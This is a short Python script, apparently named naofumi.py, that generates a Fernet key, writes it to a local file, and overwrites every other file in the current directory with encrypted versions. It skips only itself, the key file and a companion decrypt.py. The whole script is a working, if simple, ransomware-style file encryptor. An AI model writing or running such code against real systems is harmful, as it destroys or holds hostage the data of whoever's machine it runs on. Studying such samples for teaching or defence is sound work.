
#Finding files in the directory
import os

#for encrypting files in the dirctory
from cryptography.fernet import Fernet

key=Fernet.generate_key()

with open("fkey","wb") as fkey:
	fkey.write(key)


files=[]

for file in  os.listdir():
	if file =="naofumi.py" or file =="fkey" or file == "decrypt.py" :
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

for file in files:
	with open(file,"rb") as ofile:
		info=ofile.read()
	info_encry=Fernet(key).encrypt(info)
	with open(file,"wb") as ofile:
		ofile.write(info_encry)
